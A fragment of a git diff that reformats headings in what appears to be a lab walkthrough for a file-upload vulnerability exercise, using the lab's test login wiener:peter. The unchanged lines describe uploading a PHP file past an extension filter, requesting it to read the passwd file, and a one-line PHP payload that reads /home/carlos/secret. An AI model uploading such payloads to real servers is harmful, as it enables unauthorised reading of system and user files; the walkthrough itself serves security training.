@@ -6,7 +6,9 @@
 
 ## You can log in to your own account using the following credentials: `wiener:peter`
 
-### step1
+---
+
+### step 1
 
 upload an image
 and try to upload a php extension file it will not upload
@@ -43,7 +45,9 @@ GET /files/avatars/test.php HTTP/1.1
 
 you will get all passwd file
 
-now do ### step1 for secret code
+now do **\_\_\_\_**
+
+### step 1 for secret code
 
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 
